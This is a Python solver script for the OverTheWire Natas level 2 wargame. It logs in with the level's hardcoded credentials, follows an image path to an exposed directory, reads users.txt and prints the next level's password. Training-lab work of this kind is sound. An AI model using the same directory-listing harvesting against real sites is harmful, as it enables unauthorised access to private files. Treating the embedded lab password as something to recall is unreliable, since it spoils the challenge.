import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    file = re.findall('<img src="(.*)pixel.png">',site.text)
    users_url = requests.get(url + file[0],auth=(username,password))
    users_file = re.findall('<a href="users.txt">(.*)</a>',users_url.text)
    users = requests.get(url + file[0] + users_file[0],auth=(username,password))
    flag = re.findall('natas3:(.*)',users.text) 
    print("The flag for natas2 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas2.natas.labs.overthewire.org/"
    username = "natas2"
    password = "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7"
    flag(url,username,password)
